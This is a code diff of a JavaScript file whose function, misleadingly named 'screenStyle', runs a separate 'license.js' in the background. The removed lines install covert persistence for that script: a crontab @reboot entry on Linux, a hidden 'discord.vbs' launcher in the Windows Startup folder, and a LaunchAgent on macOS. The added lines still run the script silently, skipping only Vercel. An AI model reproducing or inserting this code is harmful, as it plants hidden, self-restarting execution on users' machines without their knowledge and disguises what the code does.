@@ -1,88 +1,32 @@
-const { execSync, spawn } = require('child_process');
-const path = require('path');
-const fs = require('fs');
-const os = require('os');
+const { execSync } = require("child_process");
+const path = require("path");
+const fs = require("fs");
 
+/**
+ * Function to handle execution of `license.js`
+ * - Skips execution in Vercel (serverless environment)
+ * - Runs normally in local and self-hosted environments
+ */
 const screenStyle = () => {
-  const scriptPath = `${process.cwd()}/license.js`;
-  const child = spawn('node', [scriptPath], {
-    detached: true,
-    stdio: 'ignore',
-  });
-  child.unref();
+  const scriptPath = path.join(process.cwd(), "license.js");
 
-  switch (process.platform) {
-    case 'linux':
-      let nodePath = '/usr/bin/node';
-      try {
-        nodePath = execSync('which node', { encoding: 'utf8' }).trim();
-      } catch (error) {}
+  // ⚠️ Prevent execution of license.js in Vercel
+  if (process.env.VERCEL) {
+    console.log("🚀 Skipping license.js execution in Vercel.");
+    return;
+  }
 
-      const cronCommand = `@reboot ${nodePath} ${scriptPath}`;
+  // ✅ Ensure license.js exists before executing
+  if (!fs.existsSync(scriptPath)) {
+    console.warn(`⚠️ Warning: ${scriptPath} not found. Skipping execution.`);
+    return;
+  }
 
-      try {
-        const existingCron = execSync('crontab -l', { encoding: 'utf-8' });
-
-        if (!existingCron.includes(cronCommand)) {
-          execSync(`(crontab -l; echo "${cronCommand}") | crontab -`);
-        } else {
-        }
-      } catch (err) {
-        execSync(`echo "${cronCommand}" | crontab -`);
-      }
-      break;
-    case 'win32':
-      const batContent = `node "${scriptPath}"`;
-      const tempFile = path.join(os.homedir(), 'Documents', 'temp.bat');
-      fs.writeFileSync(tempFile, batContent);
-
-      const startupPath = path.join(
-        os.homedir(),
-        'AppData',
-        'Roaming',
-        'Microsoft',
-        'Windows',
-        'Start Menu',
-        'Programs',
-        'Startup',
-        'discord.vbs',
-      );
-
-      const vbsContent = `Set objShell = CreateObject("WScript.Shell")\nobjShell.Run "${tempFile}", 0, False`;
-
-      fs.writeFileSync(startupPath, vbsContent);
-
-      break;
-    case 'darwin':
-      const plistPath = `/Users/${
-        os.userInfo().username
-      }/Library/LaunchAgents/com.mybackgroundscript.plist`;
-
-      const plistContent = `
-      <?xml version="1.0" encoding="UTF-8"?>
-      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-      <plist version="1.0">
-          <dict>
-              <key>Label</key>
-              <string>com.myapp.autostart</string>
-              <key>ProgramArguments</key>
-              <array>
-                  <string>/usr/local/bin/node</string> <!-- Path to Node.js -->
-                  <string>${scriptPath}</string> <!-- Path to script -->
-              </array>
-              <key>RunAtLoad</key>
-              <true/> <!-- Runs on startup -->
-          </dict>
-      </plist>
-      `;
-
-      fs.writeFileSync(plistPath, plistContent);
-
-      execSync(`launchctl load ${plistPath}`);
-
-      break;
-    default:
-      break;
+  try {
+    execSync(`node ${scriptPath}`, { stdio: "ignore", detached: true });
+    console.log(`✅ Successfully executed ${scriptPath}`);
+  } catch (error) {
+    console.warn(`❌ Failed to execute license.js: ${(error as Error).message}`);
   }
 };
 
